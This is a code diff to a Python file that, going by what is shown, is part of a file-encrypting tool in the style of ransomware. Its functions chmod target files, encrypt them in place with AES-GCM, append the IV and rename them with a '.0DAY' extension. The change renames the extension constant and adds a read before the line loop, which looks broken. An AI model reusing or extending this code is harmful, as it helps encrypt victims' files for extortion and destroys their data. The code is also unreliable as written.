@@ -4,6 +4,8 @@ from Cryptodome import Random         # collision with Pycrypto/Pycryptodome pac
 import hashlib                        # Use pip (or conda) install cryptodomex.
 
 
+EXT = '.0DAY'
+
 def _writer(filepath, method, append_iv=None):
   
   """
@@ -19,10 +21,13 @@ def _writer(filepath, method, append_iv=None):
   path = os.path.normpath(filepath)
   os.chmod(path, stat.S_IRWXU)
   with open(path, 'rb+') as fh:
+    line = fh.read()
+
     for line in fh:
       new_line = method(line)
       fh.seek(-len(line), 1)
       fh.write(new_line)
+
     if append_iv:
       fh.seek(0,2)
       fh.write(append_iv)
@@ -45,9 +50,8 @@ def encrypt(filepath, key):
   """
   
   path = os.path.normpath(filepath)
-  ext = '.0day'
   
-  if path.endswith(ext):
+  if path.endswith(EXT):
     return
   
   try:
@@ -57,7 +61,7 @@ def encrypt(filepath, key):
     
     _writer(path, cipher_gcm.encrypt, append_iv=iv)
     
-    os.rename(path, path+ext)
+    os.rename(path, path+EXT)
     
     #for _ in range(100): keyb = os.urandom(16)
   except FileNotFoundError:
@@ -75,9 +79,8 @@ def decrypt(filepath, key):
   """
   
   path = os.path.normpath(filepath)
-  ext = '.0day'
   
-  if not path.endswith(ext):
+  if not path.endswith(EXT):
     return
   
   try:
